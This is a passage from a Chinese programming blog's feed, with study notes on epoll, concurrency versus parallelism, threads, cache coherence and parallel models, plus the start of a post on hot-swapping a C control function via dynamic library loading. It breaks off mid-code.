红黑树和链表。这其中我会在以后进行研究并发blog记录学习了解这几种数据结构并思考采用这些结构的原因。epoll被应用在Nginx和Redis这表明其结构是优秀的，大部分情况下可考虑采用epoll。同时epoll也采用了观察者的设计模式，这个回头也可以了解。</p><h2 id="To-do"><a href="#To-do" class="headerlink" title="To do"></a>To do</h2><ul><li>了解几种数据结构包括链表，红黑树，bitmap</li><li>更进一步了解epoll的用法，包含其水平触发和边缘触发</li><li>动手自己尝试用这几个模型</li><li>了解epoll的观察者设计模式</li><li>从数据结构解释epoll比poll更有优势的原因</li><li>对UNIX系统的文件描述符做更深入的了解</li></ul><h2 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h2><p>Python Select官方文档：<a href="https://docs.python.org/3/library/select.html">https://docs.python.org/3/library/select.html</a></p><p>select/poll/epoll视屏讲解（讲的很好）:<a href="https://www.bilibili.com/video/BV1qJ411w7du?from=search&amp;seid=10159331074298299316">https://www.bilibili.com/video/BV1qJ411w7du?from=search&amp;seid=10159331074298299316</a></p><p>select/poll/epoll Python代码样例:<a href="https://www.cnblogs.com/muzinan110/p/5004469.html">https://www.cnblogs.com/muzinan110/p/5004469.html</a> P.S虽然是Python2但是无伤大雅</p><p>select/poll/epoll区别和C代码样例:<a href="https://devarea.com/linux-io-multiplexing-select-vs-poll-vs-epoll/#.YI50iKERUUH">https://devarea.com/linux-io-multiplexing-select-vs-poll-vs-epoll/#.YI50iKERUUH</a></p><p>I/O样例图：<a href="https://www.yuque.com/gotaoey/vaeroo/iqdfgh%E5%92%8C%E5%AF%B9%E5%BA%94%E8%A7%86%E9%A2%91%E8%AE%B2%E8%A7%A3https://www.bilibili.com/video/BV1vv4y1o7pu/?spm_id_from=333.788.recommend_more_video.0">https://www.yuque.com/gotaoey/vaeroo/iqdfgh和对应视频讲解https://www.bilibili.com/video/BV1vv4y1o7pu/?spm_id_from=333.788.recommend_more_video.0</a></p><p>还有很多引用在文中已经指出，由于引用资料较多此处列举未完敬请谅解</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;最近正在写一个端口映射小程序。主要实现内网的端口转发功能。拿80端口的Apache举例来说，就是我在一个没有公网IP的内网建立了一个Apac</summary>
      
    
    
    
    <category term="Python学习" scheme="https://zwh-china.github.io/categories/Python%E5%AD%A6%E4%B9%A0/"/>
    
    
  </entry>
  
  <entry>
    <title>并行编程学习</title>
    <link href="https://zwh-china.github.io/2021/04/19/%E5%B9%B6%E8%A1%8C%E7%BC%96%E7%A8%8B%E5%AD%A6%E4%B9%A0/"/>
    <id>https://zwh-china.github.io/2021/04/19/%E5%B9%B6%E8%A1%8C%E7%BC%96%E7%A8%8B%E5%AD%A6%E4%B9%A0/</id>
    <published>2021-04-18T18:32:29.000Z</published>
    <updated>2021-04-27T11:25:20.283Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>由于我的python基础部分已经自学完，也写过一些很简单的小项目。所以我想寻找一种方式来提升一下我编程的水平。在接触socket编程时，我第一次接触到了多线程这个概念。具体场景就是需要一个UDP监听函数在后台运行，但是默认下在主函数调用一个函数后，主函数会处于一个挂起状态，在运行完函数后，main函数才能继续向下运行。这个过程也叫上下文切换。但是我的需求是UDP在整个程序的生命周期都必须在后台运行。因此也就去了解了多线程，多进程编程技术。进而我想相对系统和深入的了解这方面的知识。</p><h3 id="1-1-首先我去了解了一下什么是并发，并行，串行，同步，异步"><a href="#1-1-首先我去了解了一下什么是并发，并行，串行，同步，异步" class="headerlink" title="1-1 首先我去了解了一下什么是并发，并行，串行，同步，异步"></a>1-1 首先我去了解了一下什么是并发，并行，串行，同步，异步</h3><p>复制粘贴一下CSDN文章</p><p>1.并发编程又叫多线程编程。</p><pre><code>   在程序中，往往有很多很耗时的工作，比如上传文件、下载文件、跟客户聊天需要长时间建立连接。这种时候，一个线程是服务不了多个用户的，会产生因为资源独占产生的等待问题。并发的实质是一个物理CPU(也可以多个物理CPU) 在若干道程序之间多路复用，并发性是对有限物理资源强制行使多用户共享以提高效率。(并发指的是任务数多余cpu核数，通过操作系统的各种任务调度算法，实现用多个任务“一起”执行（实际上总有一些任务不在执行，因为切换任务的速度相当快，看上去一起执行而已））并发当有多个线程在操作时,如果系统只有一个CPU,则它根本不可能真正同时进行一个以上的线程，它只能把CPU运行时间划分成若干个时间段,再将时间 段分配给各个线程执行，在一个时间段的线程代码运行时，其它线程处于挂起状。.这种方式我们称之为并发(Concurrent)。</code></pre><p>2.“并行”指两个或两个以上事件或活动在同一时刻发生。在多道程序环境下，并行性使多个程序同一时刻可在不同CPU上同时执行。（hadoop集群就是并行计算的）</p><pre><code> 当系统有一个以上CPU时,则线程的操作有可能非并发。当一个CPU执行一个线程时，另一个CPU可以执行另一个线程，两个线程互不抢占CPU资源，可以同时进行，这种方式我们称之为并行(Parallel)。</code></pre><p>并发和并行</p><pre><code>并发和并行是即相似又有区别的两个概念，并行是指两个或者多个事件在同一时刻发生；而并发是指两个或多个事件在同一时间间隔内发生。在多道程序环境下，并发性是指在一段时间内宏观上有多个程序在同时运行，但在单处理机系统中，每一时刻却仅能有一道程序执行，故微观上这些程序只能是分时地交替执行。倘若在计算机系统中有多个处理机，则这些可以并发执行的程序便可被分配到多个处理机上，实现并行执行，即利用每个处理机来处理一个可并发执行的程序，这样，多个程序便可以同时执行。</code></pre><p>3.串行、并行：</p><pre><code>   并行和串行指的是任务的执行方式。串行是指多个任务时，各个任务按顺序执行，完成一个之后才能进行下一个。并行指的是多个任务可以同时执行，异步是多个任务并行的前提条件。</code></pre><p>4.同步、异步：</p><pre><code>     指的是能否开启新的线程。同步不能开启新的线程，异步可以。     异步：异步和同步是相对的，同步就是顺序执行，执行完一个再执行下一个，需要等待、协调运行。异步就是彼此独立,在等待某事件的过程中继续做自己的事，不需要等待这一事件完成后再工作。线程就是实现异步的一个方式。异步是让调用方法的主线程不需要同步等待另一线程的完成，从而可以让主线程干其它的事情。     异步和多线程并不是一个同等关系,异步是最终目的,多线程只是我们实现异步的一种手段。异步是当一个调用请求发送给被调用者,而调用者不用等待其结果的返回而可以做其它的事情。实现异步可以采用多线程技术或则交给另外的进程来处理。</code></pre><p>原文链接：<a href="https://blog.csdn.net/qq/_26442553/article/details/78729793">https://blog.csdn.net/qq\_26442553/article/details/78729793</a></p><p>再放几张图来直观形象的表现一下</p><p>01 串行</p><p>串行（ Sequential ）简单来说就是一次只能做一件事情，而且还得按照顺序依次执行，后面的代码段必须等到前面代码段的任务执行完毕后才能执行。</p><p><img src="https://img-blog.csdnimg.cn/2020071123450489.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2tpbmdjb2Rpbmc=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>假设我们目前经费有限，只有一名工人，工人没有三头六臂，因此他需要一件接着一件来完成任务，只有完成一件任务后才能去完成下一件任务。</p><p>此时完成总体装修工程，一共需要花费 2 + 1 + 3 = 6 天的时间<br>02 并行</p><p>并行（ parallelism ）指的是在同一时刻，任务可以同时开始进行，彼此之间没有依赖关系。整个周期的总耗时取决于耗时最长的那件事情所需的时间。</p><p><img src="https://img-blog.csdnimg.cn/20200711234514195.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2tpbmdjb2Rpbmc=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>假设我们目前经费比较充足，雇佣了三名工人。装修工程的子任务之间没有依赖关系，因此工人们可以对墙体拆迁、安装水电线、粉刷铺地板这三件事情同时开工，每一名工人负责一件任务。</p><p>此时完成总体装修工程，总耗时取决于耗时最长的那件事情（在这里就是粉刷、铺地板）所需的时间，因此一共需要花费 3 天的时间<br>03 并发</p><p>并发（ concurrency ）是以交替的方式利用等待某件事情完成的时间来做其他事情。整个周期的总耗时：在一件任务等待时间内，节省这段等待时间来完成另一件任务。</p><h6 id><a href="#" class="headerlink" title></a><img src="https://img-blog.csdnimg.cn/20200711234524559.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2tpbmdjb2Rpbmc=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></h6><p>假设我们目前经费不充足，只能雇佣了一名工人。仔细对粉刷、铺地板这件任务进行分析，发现它其实包含两部分，第一部分是进行粉刷墙壁、铺地板，第二部分是进行风干，分别花费 2 天和 1 天的时间。</p><p>粉刷、铺地板=粉刷墙壁、铺地板（ 2 天）+ 风干（ 1 天）</p><p>在等待房屋风干的时候，工人此时可以去完成其他的任务以节省时间。</p><p>在第三天的时候，从宏观角度来看，工人同时做了两件事情，但是微观的角度来看，工人没有三头六臂，其实他只在进行安装水电线的工作。</p><p>此时完成总体装修工程，一共需要花费 5 天的时间。<br>04 并行 VS 并发</p><p><img src="https://img-blog.csdnimg.cn/20200711234531486.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2tpbmdjb2Rpbmc=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>根据CPU多路复用的原则，会将CPU的执行时间切分成很多细微的CPU时间片，一个CPU在同一时间只能完成一件任务。</p><p>对于单核CPU，当面对多个任务的时候，每个小时间片会执行一个操作，多个操作之间快速切换执行，造成了同时运行的假象。其实CPU在一个时间片内运行某一个线程时，其它线程处于挂起状态，这种方式我们称之为并发。</p><p>当系统有一个以上 CPU 时，则线程的操作可以并行开始。当一个 CPU 执行一个线程时，另一个 CPU 可以执行另一个线程，两个线程互不抢占 CPU 资源，他们同时进行，这种方式我们称之为并行。</p><p>并发的出现，比传统串行系统提高效率与时间，但带来了额外性能开销，如：系统调度和上下文切换。</p><p>多核CPU使并行成为可能，大大提高了处理能力。</p><p>原文链接：<a href="https://blog.csdn.net/kingcoding/article/details/107293131">https://blog.csdn.net/kingcoding/article/details/107293131</a></p><p>还有知乎一位答友用的跑步的例子</p><pre><code>说个跑步的例子：异步：训练的时候，运动员在各自的跑道上跑自己的步多线程：有很多条跑道，运动员看到哪里有空的跑道就去跑并行：两人三足跑步，这两个人就是并行补充：同步：所有跑道只剩一条的时候，运动员在一条跑道上跑完一个到一个并发：一组运动员一起跑，隔一段时间到下一组运动员==========华丽分界线 2018-03-07更新============关系：同步的时候无法异步，但异步的过程中可以有同步并发的执行时间间隔中，也可能会变成并行**以上是个人理解，如有错误，请各位大佬指正作者：呵Sever链接：https://www.zhihu.com/question/28550867/answer/236035067</code></pre><h4 id="我的总结"><a href="#我的总结" class="headerlink" title="我的总结:"></a>我的总结:</h4><p>其实在看这些回答时，我又考虑了另外一个问题，我们现在的处理器都是比如说我的电脑CPU 16core 32thread 也就是16核心32线程。这是什么意思呢？我去国外找了一篇比较详细的教程限于篇幅这里就不复制粘贴了（<a href="https://phoenixnap.com/kb/single-vs-dual-processors-server%EF%BC%89%E3%80%82%E9%80%9A%E4%BF%97%E7%9A%84%E8%AF%B4%EF%BC%8C%E8%BF%99%E9%87%8C%E7%9A%84core%E5%B0%B1%E6%98%AFCPU%E4%B8%AD%E5%B0%81%E8%A3%85%E7%9A%84%E7%89%A9%E7%90%86%E5%A4%84%E7%90%86%E5%8D%95%E5%85%83%EF%BC%8C%E8%80%8Cthread%E8%A1%A8%E6%98%8E%E6%AF%8F%E4%B8%AA%E6%A0%B8%E5%8F%AF%E4%BB%A5handle%E4%B8%A4%E4%B8%AA%E7%BA%BF%E7%A8%8B%EF%BC%8C%E4%BD%86%E6%98%AF%E5%B9%B6%E9%9D%9E%E5%90%8C%E6%97%B6%EF%BC%8C%E8%80%8C%E6%98%AF%E5%BF%AB%E9%80%9F%E5%88%87%E6%8D%A2%E4%B8%8B%EF%BC%8C%E6%89%80%E4%BB%A5%E8%BF%99%E4%BF%A9thread%E6%B2%A1%E6%B3%95">https://phoenixnap.com/kb/single-vs-dual-processors-server）。通俗的说，这里的core就是CPU中封装的物理处理单元，而thread表明每个核可以handle两个线程，但是并非同时，而是快速切换下，所以这俩thread没法</a> parallelism。16核每个核可以有俩线程。表明信息通道总数是32（If a CPU has six cores with two threads per core, that means there are twelve paths for information to be processed.）。文章中还讲了有多个物理CPU的情况，因为很多服务器主板是支持多个CPU的，主板有多个CPU Socket。有点很重要，无论CPU再怎么高级，用了啥技术什么超线程之类的，一个物理Core一次就是只能运行一个Thread</p><p>那么对于并行，我认为可以看作是core和core之间同时运行不同的Thread。对于并发应该是对于一个core来说的，一个Thread运行一会停下来，另一个开始运行，以此轮替。 对于串行有点像并发，但是不像并发那样灵活，必须完全搞定一个Thread才能搞下一个Thread。对于同步和异步，这两个应该是一种模型，对于同步来说，具体的例子就是（也是参考的）去餐厅点菜，同步就是一桌点完下桌去点，异步就是A桌点了一个菜，后厨去做，B桌也点了一个菜，后厨去做….其具体实现就是并发</p><p>然后其实我又想到一个问题那就是，CPU的Thread和软件里面的Thread是怎样的关系。好家伙一搜又出来一堆，贴一个StackOverFlow的回答吧</p><pre><code class="STATA">Q:What is the difference between software threads, hardware threads and java threads?Are software threads, java threads and hardware threads independent or interdependent? I am asking this because, I know Java threads are created inside a process with in jvm (java.exe).Also is it true that these different process are executed on different hardware threads?A:A &quot;hardware thread&quot; is a physical CPU or core. So, a 4 core CPU can genuinely support 4 hardware threads at once - the CPU really is doing 4 things at the same time.One hardware thread can run many software threads. In modern operating systems, this is often done by time-slicing - each thread gets a few milliseconds to execute before the OS schedules another thread to run on that CPU. Since the OS switches back and forth between the threads quickly, it appears as if one CPU is doing more than one thing at once, but in reality, a core is still running only one hardware thread, which switches between many software threads.Modern JVMs map java threads directly to the native threads provided by the OS, so there is no inherent overhead introduced by java threads vs native threads. As to hardware threads, the OS tries to map threads to cores, if there are sufficient cores. So, if you have a java program that starts 4 threads, and have 4 or more cores, there&#39;s a good chance your 4 threads will run truly in parallel on 4 separate cores, if the cores are idle.URL:https://stackoverflow.com/questions/5593328/software-threads-vs-hardware-threads值得注意的是，这个回答的赞是最多的，但是没被选为标准答案。标准答案如下（感觉还是赞多的回答容易理解，可能是我没怎么了解Java的缘故）A：Software threads are threads of execution managed by the operating system.Hardware threads are a feature of some processors that allow better utilisation of the processor under some circumstances. They may be exposed to/by the operating system as appearing to be additional cores (&quot;hyperthreading&quot;).In Java, the threads you create maintain the software thread abstraction, where the JVM is the &quot;operating system&quot;. Whether the JVM then maps Java threads to OS threads is the JVM&#39;s business (but it almost certainly does). And then the OS will be using hardware threads if they are available.</code></pre><p>这里面我注意到提到几种Thread,拿JAVA运行在JVM来说，代码里的Thread是代码Thread，被JVM映射到OS级Native Thread，OS再映射到Hardware Thread也就是CPU核的Thread。</p><h3 id="1-2-费林分类法（Flynn’s-Taxonomy）"><a href="#1-2-费林分类法（Flynn’s-Taxonomy）" class="headerlink" title="1-2 费林分类法（Flynn’s Taxonomy）"></a>1-2 费林分类法（Flynn’s Taxonomy）</h3><p>费林分类法是分类并行计算机系统架构的一种方式。它基于，Instruction和Data Flow两个概念</p><p><img src="http://106.15.74.181/wp-content/uploads/2021/04/image-20210417005116799-1024x719.png"></p><p><img src="http://106.15.74.181/wp-content/uploads/2021/04/image-20210417005342757-1024x341.png"></p><p>SISD主要应用于很老式的单核处理器上，在现代架构处理器中已经是很少见的了</p><p><img src="http://106.15.74.181/wp-content/uploads/2021/04/image-20210417013054402-1-1024x538.png"></p><h3 id="1-3-共享内存"><a href="#1-3-共享内存" class="headerlink" title="1-3 共享内存"></a>1-3 共享内存</h3><p>再看看我们最常用的MIMD架构。一般的现代CPU都采用这个架构。评判一个并行体系结构不仅要看硬件架构还要看内存的组织。先看下共享内存模型。一个处理器在修改储存在内存系统中的数据时，如果其他处理器同时也在使用这个数据就会出现问题。已经修改的新值会从处理器缓存传递到共享内存。不过之后还得传递到所有CPU的缓存，使得他们不会处理过时的数据。</p><p><img src="http://106.15.74.181/wp-content/uploads/2021/04/image-20210417223722837-1.png"></p><p>这个问题称为缓存一致性(cache coherency)问题，是内存一致性问题的一种特殊情况。与线程编程类似，需要能够处理并发问题和同步问题的硬件。其实我是很懵逼的，大概感觉这个问题可能多少和锁有点关系。但是书上讲的也不太清楚，就去查了一下，总觉得这篇文章讲的不错。（<a href="https://blog.csdn.net/moyeshuier/article/details/103943355?spm=1001.2014.3001.5501%EF%BC%89%EF%BC%8C%E8%AF%BB%E5%AE%8C%E4%BA%86%E5%8F%91%E7%8E%B0%E8%80%81%E5%93%A5%E6%B2%A1%E7%BB%A7%E7%BB%AD%E6%9B%B4%E6%96%B0%EF%BC%8C%E4%BC%B0%E8%AE%A1%E6%98%AF%E9%B8%BD%E4%BA%86%EF%BC%8C%E6%88%91%E5%B0%B1%E6%9C%89%E6%89%BE%E4%BA%86%E6%89%BE%E5%86%99%E4%B8%80%E7%AF%87(https://www.cnblogs.com/dolphin0520/p/3920373.html)%E3%80%82%E5%8F%AF%E6%98%AF%E6%88%91%E8%BF%98%E6%98%AF%E6%B2%A1%E6%87%82%EF%BC%8C%E8%BF%99%E4%B8%9C%E8%A5%BF%E9%9C%80%E8%A6%81%E6%88%91%E7%AE%A1%E4%B8%8D%EF%BC%9F%E7%9B%B4%E5%88%B0%E6%88%91%E6%90%9C%E5%88%B0%E4%BA%86%E7%9F%A5%E4%B9%8E%E8%BF%99%E7%AF%87%E6%96%87%E7%AB%A0(https://www.zhihu.com/question/277395220/answer/640204150)%E5%B0%B1%E6%98%AF%E8%AF%B4%EF%BC%8C%E7%BC%93%E5%AD%98%E4%B8%80%E8%87%B4%E6%80%A7%E4%B8%8D%E9%9C%80%E8%A6%81%E6%88%91%E4%BB%AC%E6%93%8D%E5%BF%83%EF%BC%8C%E7%A1%AC%E4%BB%B6%E5%B7%A5%E7%A8%8B%E5%B8%88%E6%88%96%E8%80%85%E8%AF%B4%E6%90%9E%E5%BA%95%E5%B1%82%E7%9A%84%E5%B7%B2%E7%BB%8F%E6%95%B4%E4%BA%86%E4%B8%80%E5%A5%97%E5%8D%8F%E8%AE%AE%E6%88%96%E8%80%85%E6%96%B9%E6%B3%95%E4%BF%9D%E8%AF%81%E7%BC%93%E5%AD%98%E4%B8%80%E8%87%B4%E6%80%A7%E3%80%82%E4%BD%86%E6%98%AF%E6%AD%A3%E5%A6%82%E4%B9%A6%E4%B8%AD%E8%AF%B4%E5%88%B0%E7%9A%84%60%E7%BC%93%E5%AD%98%E4%B8%80%E8%87%B4%E6%80%A7%E6%98%AF%E5%86%85%E5%AD%98%E4%B8%80%E8%87%B4%E6%80%A7%E9%97%AE%E9%A2%98%E7%9A%84%E4%B8%80%E7%A7%8D%E7%89%B9%E6%AE%8A%E6%83%85%E5%86%B5%60,%E7%BC%93%E5%AD%98%E4%B8%80%E8%87%B4%E6%80%A7%E4%BF%9D%E8%AF%81%E7%9A%84%E6%98%AF%E9%A1%BA%E5%BA%8F%E4%B8%80%E8%87%B4%E6%80%A7%E8%80%8C%E9%9D%9E%E7%BA%BF%E6%80%A7%E4%B8%80%E8%87%B4%E6%80%A7%EF%BC%8C%E5%AF%B9%E4%BA%8E%E6%88%91%E8%BF%99%E7%A7%8D%E5%BE%88low%E7%9A%84%E7%A8%8B%E5%BA%8F%E7%8C%BF%E6%9D%A5%E8%AF%B4%EF%BC%8C%E5%86%99%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84%E5%A4%9A%E7%BA%BF%E7%A8%8B%E9%9C%80%E8%A6%81%E8%80%83%E8%99%91%E7%9A%84%E6%98%AF%E7%BA%BF%E6%80%A7%E4%B8%80%E8%87%B4%E6%80%A7%EF%BC%8C%E8%BF%99%E4%B8%AA%E7%BC%93%E5%AD%98%E4%B8%80%E8%87%B4%E6%80%A7%E6%88%91%E4%BB%8E%E5%BC%80%E5%A7%8B%E5%B0%B1%E6%B2%A1%E8%80%83%E8%99%91%E5%88%B0%EF%BC%8C%E6%88%91%E8%80%83%E8%99%91%E5%88%B0%E7%9A%84%E5%8F%AA%E6%98%AF%E7%BA%BF%E6%80%A7%E4%B8%80%E8%87%B4%E6%80%A7%E5%A6%82%E4%BD%95%E4%BF%9D%E8%AF%81%E3%80%82">https://blog.csdn.net/moyeshuier/article/details/103943355?spm=1001.2014.3001.5501），读完了发现老哥没继续更新，估计是鸽了，我就有找了找写一篇(https://www.cnblogs.com/dolphin0520/p/3920373.html)。可是我还是没懂，这东西需要我管不？直到我搜到了知乎这篇文章(https://www.zhihu.com/question/277395220/answer/640204150)就是说，缓存一致性不需要我们操心，硬件工程师或者说搞底层的已经整了一套协议或者方法保证缓存一致性。但是正如书中说到的`缓存一致性是内存一致性问题的一种特殊情况`,缓存一致性保证的是顺序一致性而非线性一致性，对于我这种很low的程序猿来说，写个简单的多线程需要考虑的是线性一致性，这个缓存一致性我从开始就没考虑到，我考虑到的只是线性一致性如何保证。</a></p><pre><code>cache coherence 和 memory consistency是两回事。cache coherence对程序员来说是透明的，你可以完全不关心它的存在；它所解决的问题，是一个内存里的变量，被多个cache所加载之后，一个CPU core去修改了这个变量值，如何传播到其他cache上。也就是说，有了cache coherence之后，你可以放心地在一个core里修改变量，它早晚会被另一个core读到。但是程序员其实要求的不仅于此，你可能要求，在一个core修改了一个变量，另一个core立马就能读到；或者你修改了两个变量，你要求另一个core在读到这两个变量的时候，要按照相同的顺序，比如这样的代码：作者：hellocode链接：https://www.zhihu.com/question/277395220/answer/393722704</code></pre><h3 id="1-4-并行编程模型"><a href="#1-4-并行编程模型" class="headerlink" title="1-4 并行编程模型"></a>1-4 并行编程模型</h3><p>并行编程模型是硬件和内存体系结构的一个抽象。理论上可以在任何类型的机器上实现。与前面的划分相比，这写编程模型建立在更高的层次，表示软件要以何种方式完成并行计算。每个模型分别有自己的方法与其他处理器共享信息，来访问内存和划分工作。</p><p>总的来说分这几个model</p><ul><li>  共享内存模型</li><li>  多线程模型</li><li>  消息传递/分布式内存模型</li><li>  数据并行模型</li></ul><p>我感觉书上说的其实并不是很清楚对于初学者来说，然后我就去搜了一下我能理解的（<a href="https://www.ques10.com/p/36530/explain-the-various-types-of-parallel-programming-/%EF%BC%89">https://www.ques10.com/p/36530/explain-the-various-types-of-parallel-programming-/）</a></p><p>差不就是</p><ul><li>  共享内存模型：</li></ul><p><img src="http://106.15.74.181/wp-content/uploads/2021/04/image-20210418205720950-1.png"></p><p>就是每个core里可能没有自己专有的内存空间，就是那种只对自己可见的内存。而是采取共享一块内存，所有core都在这个共享空间内读写。每个process的空间又主程序分配。再执行结束狗，这些子进程重新加入主程序。</p><p>优点：程序开发很轻松，不需要进程通讯和进行数据共享</p><p>缺点：用户不知道变量存在那？（没太懂）</p><ul><li>  消息传输模型</li></ul><p><img src="http://106.15.74.181/wp-content/uploads/2021/04/image-20210418210732237.png"></p><p>每个进程都有自己的一套数据，他们间想要交换数据之类的，就需要进程通信，每个发送行为都需要有对应的接受行为</p><p>优点：数据可以不受位置限制存储，进程间通讯是很容易的。MPI可用(MPI难度极大溜了溜了)</p><p>缺点：当发送没被接受就会阻塞导致进程停止运行</p><ul><li>  线程模型</li></ul><p><img src="http://106.15.74.181/wp-content/uploads/2021/04/image-20210418214020235-871x1024.png"></p><p>线程被定义为进程中的一小段序列。不同的线程可以在同一个core也可以在不同core执行。如果thread在不同core被执行，那么他们的执行具有一致性。</p><p>优点：程序员不需要考虑并行处理</p><p>缺点：要注意考虑两个线程不能同时更新共享的资源。</p><ul><li>  数据并行模型</li></ul><p><img src="http://106.15.74.181/wp-content/uploads/2021/04/image-20210418214823439-1024x440.png"></p><p>数据并行是最简单的一种并行。在这里数据集合被组织为一个常规的结构，比如说数组。许多程序对这个结构的不同部分施以相同操作。设想你要把两个都具有100个元素的数组的对应项相加并将结果储存在新的数组。如果有4个核心（processor）那么每个核心(processor)都可以做25次运算。P.S就这个我觉得最好理解emm</p><hr><p>2021/4/27 更新</p><p>找到一个讲的非常好的各种相关概念的知乎</p><p><a href="https://zhuanlan.zhihu.com/p/343232126">https://zhuanlan.zhihu.com/p/343232126</a></p><h2 id="上述内容可以归纳总结成下表："><a href="#上述内容可以归纳总结成下表：" class="headerlink" title="上述内容可以归纳总结成下表："></a><strong>上述内容可以归纳总结成下表：</strong></h2><table><thead><tr><th>并发类型</th><th>切换机制</th><th>CPU数量</th><th>适用场景</th><th>代表Python库</th></tr></thead><tbody><tr><td>多线程（抢占式多任务处理）</td><td>操作系统决定何时切换任务</td><td>1个</td><td>I/O密集型</td><td>_thread(已淘汰）, threading, cocurrent.futures, nornir</td></tr><tr><td>异步（协作式多任务处理）</td><td>任务本身决定何时切换</td><td>1个</td><td>I/O密集型</td><td>asyncio, netdev, aiohttp, aioping, gevent, tornado, twisted</td></tr><tr><td>多进程 （并行）</td><td>所有任务同时运行</td><td>多个</td><td>CPU密集型</td><td>multiprocessing</td></tr></tbody></table>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;由于我的python基础部分已经自学完，也写过一些很简单的小项目。所以我想寻找一种方式来提升一下我编程的水平。在接触socket编程时，我第</summary>
      
    
    
    
    <category term="Python学习" scheme="https://zwh-china.github.io/categories/Python%E5%AD%A6%E4%B9%A0/"/>
    
    
  </entry>
  
  <entry>
    <title>初识dll热补丁</title>
    <link href="https://zwh-china.github.io/2021/03/31/%E5%88%9D%E8%AF%86dll%E7%83%AD%E8%A1%A5%E4%B8%81/"/>
    <id>https://zwh-china.github.io/2021/03/31/%E5%88%9D%E8%AF%86dll%E7%83%AD%E8%A1%A5%E4%B8%81/</id>
    <published>2021-03-30T18:39:18.000Z</published>
    <updated>2021-04-20T21:15:38.471Z</updated>
    
    <content type="html"><![CDATA[<p>寒假皮条侠给了我个单子需求大概是这样</p><p><a href="http://106.15.74.181/wp-content/uploads/2021/03/Assignment_2020-21-1.pdf">英文原版<br>Assignment_2020-21-1</a><a href="http://106.15.74.181/wp-content/uploads/2021/03/Assignment_2020-21-1.pdf">下载</a></p><p>中文翻译版</p><p><a href="http://106.15.74.181/wp-content/uploads/2021/03/Assignment_2020-21-%E4%B8%AD%E6%96%87%E6%8F%8F%E8%BF%B0.docx">Assignment_2020-21-中文描述</a><a href="http://106.15.74.181/wp-content/uploads/2021/03/Assignment_2020-21-%E4%B8%AD%E6%96%87%E6%8F%8F%E8%BF%B0.docx">下载</a></p><p>大概就是模拟一个工业控制器，这个控制器在运行中若收到某信号，则温度算法需要改变，但是不能停机，同时需要新算法和旧算法的交接是渐进的。再通俗点就是在不关闭程序的情况下替换函数。最后在皮条侠指点下，我选择用dll/so动态加载来解决这个问题具体代码如下</p><p>main.c</p><pre><code>#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;math.h&gt;#include &lt;unistd.h&gt;int control_function(const unsigned k, double* u)    &#123;*(u) = sin((double)k / 50.0);          // 计算设备的输入return 0;&#125;                            // control_function()int main() &#123;    unsigned t = 0;double u;while(1)       &#123;       if(control_function(t, &amp;u) == -1)&#123;printf(&quot;control_function failed\n&quot;);           exit(-1);           &#125;printf(&quot;%lf @ %u\n&quot;, u, t);               // 模拟该控制器的输入u 到设备           t++;                              // Increment time index           sleep(1);             // Sampling time... maybe 10-15 minutes in practice&#125;return 0;                     // Should never reach here!&#125;                           // main())</code></pre><p>这个u的值就是模拟的温度值，control_function就是温度控制算法，也就是需要可以被动态替换的</p><p>以下是我的方案</p><p>main.c</p><pre><code>#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;dlfcn.h&gt;#include &lt;unistd.h&gt;#include &lt;pthread.h&gt;#include &lt;sys/socket.h&gt;#include &lt;sys/types.h&gt;#include &lt;arpa/inet.h&gt;#include &lt;string.h&gt;#define SERV_PORT 9000int(*old_control_function)(const unsigned , double*); // define the function pointerint(*control_function)(const unsigned , double*); // define the function pointer for progressive substitutionconst char* dllPath=&quot;./controller.so&quot;; // controller.so is the default so file for the program to run for the default algorithmint initialize_status=0 , no_load=1 , reload_status=0; //set default so file  detect reload so file status  control progressive stagedouble cnt=0.1;// misc variablesconst char dir_path[]=&quot;./&quot;;char new_file_path[2048];_Noreturn void * Listener()&#123;    struct sockaddr_in serv_addr,client_addr;    socklen_t addr_len;    char buf[2048];    //AF_INET:ipv4 SOCK_DGRAM 0: default protocol(udp/tcp)    int skt=socket(AF_INET,SOCK_STREAM,0);    bzero(&amp;serv_addr,sizeof(serv_addr));    serv_addr.sin_family=AF_INET;    serv_addr.sin_port=htons(SERV_PORT);    serv_addr.sin_addr.s_addr=htonl(INADDR_ANY);    bind(skt,(struct sockaddr *)&amp;serv_addr,sizeof(serv_addr));    listen(skt,10);    addr_len=sizeof(client_addr);    char reply[]=&quot;Successfully received your call\n&quot;;    char verify[]=&quot;Emergency\n&quot;;    char reply_verify[]=&quot;Please input new so file name\n&quot;;    memset(buf,&#39;\0&#39;,sizeof(buf));    while(1)    &#123;        int client_skt=accept(skt,(struct sockaddr *)&amp;client_addr,&amp;addr_len);        int len=recv(client_skt,buf,sizeof(buf),0);        printf(&quot;%s\n&quot;,buf);        printf(&quot;%s\n&quot;,verify);        len=send(client_skt,reply,strlen(reply),0);        //printf(&quot;strcmp(a, b) : %d\n&quot;, strcmp(buf, verify));        if(strcmp(buf,verify)==0)        &#123;            printf(&quot;will reload the 